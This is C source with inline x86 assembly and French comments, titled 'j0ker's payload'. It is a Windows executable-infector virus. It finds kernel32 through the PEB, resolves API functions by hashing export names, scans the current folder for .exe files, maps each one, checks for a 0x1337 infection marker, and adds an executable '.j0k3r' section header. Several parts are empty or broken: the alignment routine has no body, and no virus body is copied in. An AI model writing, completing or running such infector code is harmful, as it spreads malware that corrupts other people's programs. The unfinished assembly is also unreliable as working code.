#include <windows.h>
#include <stdio.h>
void rechercheGetProcAddressEtLoadLibrary();

int main()
{
	printf("j0ker's payload.\nAdresse du payload : %x\n" , rechercheGetProcAddressEtLoadLibrary );

	rechercheGetProcAddressEtLoadLibrary();
	return 0;
}

void __declspec(naked) rechercheGetProcAddressEtLoadLibrary()
{
    __asm
    {
        LetsGo:
        jmp Debut

        /*******************************************************/
        /*******************************************************/

        aligneSur:
        /* ESI -> Dword à aligner ; EDI -> l'alignement */




        /*******************************************************/
        /*******************************************************/

        infecteBinaire:
        push ebp
        mov ebp,esp

        /*
            [EBP+8]                -> pointeur sur le nom du binaire

            [EBP+12]               -> pointeur sur les infos
            [ ( [EBP+12] )     ]   -> GetProcAddress
            [ ( [EBP+12] ) - 4 ]   -> Kernel32 ImageBase
            [ ( [EBP+12] ) - 8 ]   -> LoadLibraryA
            [ ( [EBP+12] ) - 12]   -> Compteur de fichier infecté
        */

        mov ebx, [ebp+12]
        cmp dword ptr [ebx-12],00000001h //1 fichiers déjà infecté ?
        je finInfection

        push 41656Ch
        push 69466574h
        push 61657243h //CreateFileA

        mov ecx,esp
        push ecx
        push [ebx-4]
        call [ebx]

        push 0h
        push 0h
        push 3h         //OPEN_EXISTING
        push 0h
        push 3h         //FILE_SHARE_READ|FILE_SHARE_WRITE
        push 0C0000000h //GENERIC_READ|GENERIC_WRITE
        push [ebp+8]
        call eax

        cmp eax,0FFFFFFFFh
        je finInfection

        mov [ebp-4],eax

        push 4167h
        push 6e697070h
        push 614d656ch
        push 69466574h
        push 61657243h //CreateFileMappingA

        mov ecx,esp
        push ecx
        push [ebx-4]
        call [ebx]

        push 0h
        push 0h
        push 0h
        push 4h //PAGE_READWRITE
        push 0h
        push [ebp-4]
        call eax
        or eax,eax
        jz finInfection
        mov [ebp-4],eax

        push 65h
        push 6c694666h
        push 4f776569h
        push 5670614dh //MapViewOfFile

        mov ecx,esp
        push ecx
        push [ebx-4]
        call [ebx]

        push 0h
        push 0h
        push 0h
        push 0F001Fh //FILE_MAP_ALL_ACCESS
        push [ebp-4]
        call eax

        or eax,eax
        jz finInfection
        mov [ebp-4],eax

        /* Le binaire est correctement mappé */

        mov eax,[ebp-4]

        cmp word ptr [eax],5A4Dh  //  +0x000 e_magic          : Uint2B
        jne unmapFile


        mov eax,[eax+3Ch]         //   +0x03c e_lfanew         : Int4B
        add eax,[ebp-4]

        cmp dword ptr [eax],4550h //   +0x000 Signature        : Uint4B
        jne unmapFile

        /* Le PE semble correct */

        mov ebx,[eax+38h]       //   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
        mov [ebp-8],ebx         //      +0x020 SectionAlignment : Uint4B
        mov ebx,[eax+3Ch]
        mov [ebp-12],ebx        //      +0x024 FileAlignment    : Uint4B

        mov ebx,[eax+28h]       //      +0x010 AddressOfEntryPoint : Uint4B
        mov [ebp-15],ebx

        mov ebx,eax

        xor eax,eax
        mov ax,word ptr[ebx+6h]
        dec ax
        mov esi,ebx

        /* Verification de l'existence de la signature */

        add ebx,0F8h
        mov edx,28h
        mul edx
        add ebx,eax
        push edi
        mov edi,ebx

        mov ecx,[ebx+14h] //   +0x014 PointerToRawData : Uint4B
        mov edx,[ebx+10h] //   +0x010 SizeOfRawData    : Uint4B

        cmp ecx,0
        je popAvantUnmap

        cmp edx,0
        je popAvantUnmap

        mov eax,[ebp-4]
        add eax,ecx

        add eax,edx
        sub eax,4h

        cmp dword ptr [eax],1337h
        je popAvantUnmap

        /* Fichier non-infecté                        */

        mov ebx,esi
        xor eax,eax
        mov ax, word ptr [esi+06h]

        inc ax
        mov word ptr [ebx+6],ax  //   +0x004 FileHeader       : _IMAGE_FILE_HEADER

        add edi,28h             //F8h == sizeof(IMAGE_NT_HEADERS)
        mov ecx,edi

        mov esi,TheEnd
        mov edi,LetsGo

        sub esi,edi
        mov edi,[ebp-12]
        call aligneSur
        pop edi


        /* Creation de l'header de la section .j0k3r */

        mov dword ptr [ecx],6B306A2Eh
        mov dword ptr [ecx+4],7233h //.j0k3r

        mov dword ptr [ecx+8],0           //VSize
        mov dword ptr [ecx+12],0          //VAddress
        mov dword ptr [ecx+16],0          //RawSize
        mov dword ptr [ecx+20],0          //PtrRawData
        mov dword ptr [ecx+24],0          //PtrRelocs
        mov dword ptr [ecx+28],0          //PtrLineNumbers
        mov word  ptr [ecx+32],0           //NbrRelocs
        mov word  ptr [ecx+34],0           //NbrLineNumbers
        mov dword ptr [ecx+36],60000020h  //Characteristics = CODE|EXECUTE|READ

        mov ebx,[ebp+12]
        mov eax,[ebx-12]
        inc eax
        mov [ebx-12],eax
        jmp unmapFile

        /*                                          */

        /* Les modifications sont terminées, démmappons le fichier */

        popAvantUnmap:
        pop edi

        unmapFile:
        mov ebx,[ebp+12]
        push 656c69h
        push 46664f77h
        push 65695670h
        push 616d6e55h //UnmapViewOfFile

        mov ecx,esp
        push ecx
        push [ebx-4]
        call [ebx]

        push [ebp-4]
        call eax

        mov eax,[ebx-12]

        finInfection:
        leave
        ret

        /*******************************************************/
        /*******************************************************/

        scanDossierCourant:
        push ebp
        mov ebp,esp

        /*
            [EBP+8]               -> pointeur sur les infos

            [ ( [EBP+8] )     ]   -> GetProcAddress
            [ ( [EBP+8] ) - 4 ]   -> Kernel32 ImageBase
            [ ( [EBP+8] ) - 8 ]   -> LoadLibraryA
            [ ( [EBP+8] ) - 12]   -> Compteur fichier infecté
        */
        mov ebx,[ebp+8]

        push 4165h
        push 6c694674h
        push 73726946h
        push 646e6946h //FindFirstFileA
        mov eax,esp

        push eax
        push [ebx-4]
        call [ebx]

        mov esi,eax
        mov ebx,[ebp+8]


        push 41h
        push 656c6946h
        push 7478654eh
        push 646e6946h //FindNextFileA
        mov eax,esp

        push eax
        push [ebx-4]
        call [ebx]
        mov edi,eax

        //Nous avons nos apis, utilisons les.

        sub esp,320
        mov edx,esp
        mov [ebp-8],edx

        push 65h
		push 78652e2ah  //*.exe
        mov ecx,esp


        push edx
        push ecx
        call esi

		cmp eax,0FFFFFFFFh
		je finDuScanDossierCourant

		mov esi,eax
        mov [ebp-12],eax

		push [ebp+8]    //Pointeur sur GetProcAddress et les autres infos.
		add dword ptr [ebp-8],44
		push [ebp-8]    //Pointeur sur le nom du binaire
        call infecteBinaire

        sub dword ptr [ebp-8],44
        jmp boucleScanDossierCourant

        boucleInfectionBinaire:
        push [ebp+8]    //Pointeur sur GetProcAddress et les autres infos.
		add dword ptr [ebp-8],44
		push [ebp-8]    //Pointeur sur le nom du binaire
        call infecteBinaire

		boucleScanDossierCourant:
        push [ebp-8]    //Pointeur de la structure
		push [ebp-12]   //FindHandle
		call edi
		or eax,eax
		jnz boucleInfectionBinaire

		finDuScanDossierCourant:
        leave
        ret

        /*******************************************************/
        /*******************************************************/

        Debut:
        push ebp
        mov ebp,esp

		mov eax, fs:[30h]   // Sur le PEB


        mov eax, [eax+0Ch]  // +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
        mov eax, [eax+01Ch]  // +0x01c InInitializationOrderModuleList : _LIST_ENTRY
        mov eax, [eax]       //Prochain flink, on a ntdll.dll, puis kernel32.dll.

        mov ebx, [eax+8h]    // +0x018 DllBase: Ptr32 Void //DosHeader
        mov [esp-8],ebx

		mov eax, [ebx+3Ch]   // +0x03c e_lfanew         : Int4B


		add eax, ebx
        add eax, 18h        //  +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
		add eax, 60h        //  +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY

        mov eax, [eax]      //  +0x000 VirtualAddress   : Uint4B

        add eax, ebx        // eax = Adresse de l'export table

        push ebp

		mov ebp, [eax+18h]  //ebp fais office de compteur

		mov edx, [eax+1Ch]  //  +0x1c AddressOfFunctions
		add edx, ebx

		mov esi, [eax+20h]  // +0x020 AddressOfNames

        xor ecx,ecx

		parcoursAddressOfNames:
		mov eax,esi
		add eax,ebx
        mov eax,[eax]
		add eax,ebx         //eax = Pointeur sur le nom de la fonction
        mov [esp-12], eax

        xor edi,edi

        genereHash:
        mov eax,[esp-12]
        mov al, [eax]
		and eax,0FFh

        or eax,eax
        jz testDuHash
        shl eax,0Dh
        add edi,eax

        mov eax,[esp-12]
        inc eax
        mov [esp-12], eax

        jmp genereHash

        testDuHash:
        cmp edi , 00af4000h
        je finDuParcours

        add esi,4h

        inc ecx
        cmp ecx,ebp
        jne parcoursAddressOfNames
        jmp finSansGetProcAddress


        finDuParcours:
        push [esp-4]
        add esp,4h
		pop ebp
        mov eax, edx
        mov eax,[eax+ecx*4]
        add eax,ebx

        mov [esp-4],eax //[esp-4] -> GetProcAddress , [esp-8] -> kernel32.dll image base
        sub esp,8h

        xor eax,eax
        push eax
        push 41797261h
        push 7262694Ch
        push 64616f4Ch //LoadLibraryA

        mov eax,esp

        push eax
        push [ebp-8]
        call [ebp-4]
        mov [esp+12],eax

        mov eax,ebp
        sub eax,4

        mov dword ptr [ebp-16],0 //Compteur de fichier infecté

        push eax //Pointeur sur les informations ; GetProcAddress ; kernel32 ImageBase ; Compteur etc
        call scanDossierCourant

        jmp finPayloadNormal

        finSansGetProcAddress:
        pop ebp

        finPayloadNormal:
        leave
        ret
        TheEnd:
    }
}